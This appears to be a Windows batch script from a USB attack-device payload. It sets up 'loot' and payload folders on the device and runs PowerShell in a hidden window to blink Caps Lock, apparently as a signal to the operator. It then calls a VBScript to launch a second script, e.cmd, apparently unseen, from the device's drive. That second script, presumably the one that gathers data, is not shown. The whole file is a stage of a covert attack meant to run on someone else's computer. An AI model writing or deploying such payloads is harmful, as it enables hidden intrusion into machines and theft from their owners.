@echo off
set khan=/root/udisk/loot/not_khan
mkdir %khan% >>nul
set khan0=/root/loot/not_khan
mkdir %khan0% >>nul
set khan1=/root/udisk/payloads/exe_d
mkdir %khan1% >>nul
start /b /wait powershell.exe -nologo -WindowStyle Hidden -sta -command "$wsh = New-Object -ComObject WScript.Shell;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}')"
cscript %~d0\i.vbs %~d0\e.cmd
@exit
